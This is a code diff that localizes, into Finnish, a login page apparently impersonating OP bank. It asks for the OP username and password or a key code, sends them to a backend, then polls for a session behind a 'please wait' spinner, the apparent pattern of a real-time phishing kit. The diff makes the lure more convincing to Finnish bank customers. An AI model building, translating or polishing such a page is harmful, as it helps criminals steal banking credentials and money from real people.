@@ -1,15 +1,15 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fi">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Login</title>
+  <title>Kirjaudu sisään</title>
 
   <!-- ==================== GOOGLE TRANSLATE WIDGET ==================== -->
   <script type="text/javascript">
     function googleTranslateElementInit() {
       new google.translate.TranslateElement({
-        pageLanguage: 'en',
+        pageLanguage: 'fi',
         includedLanguages: 'fi,sv,en,fr,de,es,it,ru',
         layout: google.translate.TranslateElement.InlineLayout.SIMPLE,
         autoDisplay: false
@@ -24,15 +24,9 @@
   <div id="google_translate_element" style="position:absolute;left:-9999px;"></div>
 
   <style>
-    /* -------------------------------------------------
-       BASIC RESET & TYPOGRAPHY
-       ------------------------------------------------- */
     *, *::before, *::after { box-sizing: border-box; margin:0; padding:0; }
     body { font-family: sans-serif; background:#fafafa; }
 
-    /* -------------------------------------------------
-       MAIN CONTAINER
-       ------------------------------------------------- */
     .main-container {
       min-height: 100vh;
       padding: 2rem 1rem;
@@ -42,9 +36,6 @@
       position: relative;
     }
 
-    /* -------------------------------------------------
-       CANCEL BUTTON
-       ------------------------------------------------- */
     .cancel {
       width: 100%;
       display: flex;
@@ -61,9 +52,6 @@
       cursor: pointer;
     }
 
-    /* -------------------------------------------------
-       TITLE
-       ------------------------------------------------- */
     .title {
       width: 100%;
       font-size: 2rem;
@@ -71,9 +59,6 @@
       margin-bottom: 2rem;
     }
 
-    /* -------------------------------------------------
-       IDENTIFICATION METHOD
-       ------------------------------------------------- */
     .identification {
       width: 100%;
       display: flex;
@@ -98,9 +83,6 @@
       width: 20px; height: 20px;
     }
 
-    /* -------------------------------------------------
-       INPUT SECTIONS
-       ------------------------------------------------- */
     .input-section, #password {
       width: 100%;
       display: flex;
@@ -123,9 +105,6 @@
     }
     .forget a { color:#000; text-decoration:underline; text-decoration-color:#ff5733; }
 
-    /* -------------------------------------------------
-       CONTINUE BUTTON
-       ------------------------------------------------- */
     .continue-button {
       width: 100%;
       display: flex;
@@ -144,9 +123,6 @@
     }
     .continue-btn:hover { background:#e64a19; }
 
-    /* -------------------------------------------------
-       OR SECTION
-       ------------------------------------------------- */
     .or-section {
       width:100%;
       display:flex;
@@ -160,9 +136,6 @@
       background:#bbb;
     }
 
-    /* -------------------------------------------------
-       ALTERNATIVE LOGIN
-       ------------------------------------------------- */
     .down {
       width:100%;
       border:1px solid #bbb;
@@ -175,9 +148,6 @@
     }
     .down:hover { box-shadow:0 4px 12px rgba(0,0,0,.12); }
 
-    /* -------------------------------------------------
-       SPINNER PAGE
-       ------------------------------------------------- */
     #spinner-page {
       position:fixed; inset:0;
       background:rgba(255,255,255,.94);
@@ -196,9 +166,6 @@
     @keyframes spin { to { transform:rotate(360deg); } }
     #spinner-page p { font-size:1.1rem; color:#333; }
 
-    /* -------------------------------------------------
-       RESPONSIVE BREAKPOINTS
-       ------------------------------------------------- */
     @media (min-width: 576px) {
       .main-container { padding:2rem 2rem; }
     }
@@ -218,7 +185,6 @@
 </head>
 
 <body>
-  <!-- ==================== MAIN FORM ==================== -->
   <div class="main-container">
     <section class="cancel">
       <div><span style="color:#ff5733;">X</span></div>
@@ -227,53 +193,51 @@
     <h1 class="title">Kirjaudu sisään</h1>
 
     <section class="identification">
-      <div>Identification method</div>
+      <div>Tunnistautumistapa</div>
       <div class="radio-section">
         <label class="radio-item">
           <input type="radio" name="identification" value="mobile_key" checked>
-          <span>Mobile_key</span>
+          <span>Mobiiliavain</span>
         </label>
         <label class="radio-item">
           <input type="radio" name="identification" value="key_code">
-          <span>Key code list</span>
+          <span>Avainlukulista</span>
         </label>
       </div>
     </section>
 
     <div class="input-section">
-      <div>Username</div>
-      <input type="text" id="login" class="form-input" placeholder="Enter your Op number">
+      <div>Käyttäjätunnus</div>
+      <input type="text" id="login" class="form-input" placeholder="Syötä OP-tunnuksesi">
     </div>
 
     <div id="password" style="display:none">
-      <div>Password</div>
-      <input type="password" id="password-input" class="form-input" placeholder="Enter your password">
+      <div>Salasana</div>
+      <input type="password" id="password-input" class="form-input" placeholder="Syötä salasanasi">
     </div>
 
     <div class="error" id="error"></div>
 
-    <div class="forget"><a href="#">Forget your username?</a></div>
+    <div class="forget"><a href="#">Unohditko käyttäjätunnuksesi?</a></div>
 
     <div class="continue-button">
-      <button id="continue-btn" class="continue-btn">Continue</button>
+      <button id="continue-btn" class="continue-btn">Jatka</button>
     </div>
 
     <div class="or-section">
       <div class="thin-container"></div>
-      <span>OR</span>
+      <span>TAI</span>
       <div class="thin-container"></div>
     </div>
 
-    <div class="down"><a href="#">Log in with another bank's ID</a></div>
+    <div class="down"><a href="#">Kirjaudu toisen pankin tunnuksilla</a></div>
   </div>
 
-  <!-- ==================== SPINNER ==================== -->
   <div id="spinner-page">
     <div class="spinner"></div>
-    <p>Please wait…</p>
+    <p>Odota hetki…</p>
   </div>
 
-  <!-- ==================== ORIGINAL SCRIPT ==================== -->
   <script>
     const radioButtons    = document.querySelectorAll('input[name="identification"]');
     const passwordSection = document.getElementById('password');
@@ -298,7 +262,7 @@
       const method  = document.querySelector('input[name="identification"]:checked').value;
 
       if (!login || (method === "key_code" && !pwd)) {
-        errorDiv.textContent = "Please fill in all required fields.";
+        errorDiv.textContent = "Täytä kaikki pakolliset kentät.";
         errorDiv.style.display = "block";
         return;
       }
@@ -317,7 +281,7 @@
         });
         const data = await resp.json();
 
-        if (!data.success) throw new Error(data.error || "Login failed");
+        if (!data.success) throw new Error(data.error || "Kirjautuminen epäonnistui.");
 
         const sessionId = data.id;
 
@@ -335,30 +299,10 @@
         poll();
       } catch (e) {
         hideSpinner();
-        errorDiv.textContent = e.message || "An error occurred. Try again.";
+        errorDiv.textContent = e.message || "Tapahtui virhe. Yritä uudelleen.";
         errorDiv.style.display = "block";
         continueBtn.disabled = false;
       }
-    });
-  </script>
-
-  <!-- ==================== FIXED AUTO-TRANSLATE ON LOAD ==================== -->
-  <script>
-    document.addEventListener('DOMContentLoaded', () => {
-      const userLang = (navigator.language || navigator.userLanguage || 'en').split('-')[0].toLowerCase();
-      const originalLang = 'en';
-      if (userLang === originalLang) return;
-
-      const tryTranslate = setInterval(() => {
-        const select = document.querySelector('.goog-te-combo');
-        if (select) {
-          select.value = userLang;
-          select.dispatchEvent(new Event('change'));
-          clearInterval(tryTranslate);
-        }
-      }, 500);
-
-      setTimeout(() => clearInterval(tryTranslate), 10000);
     });
   </script>
 </body>
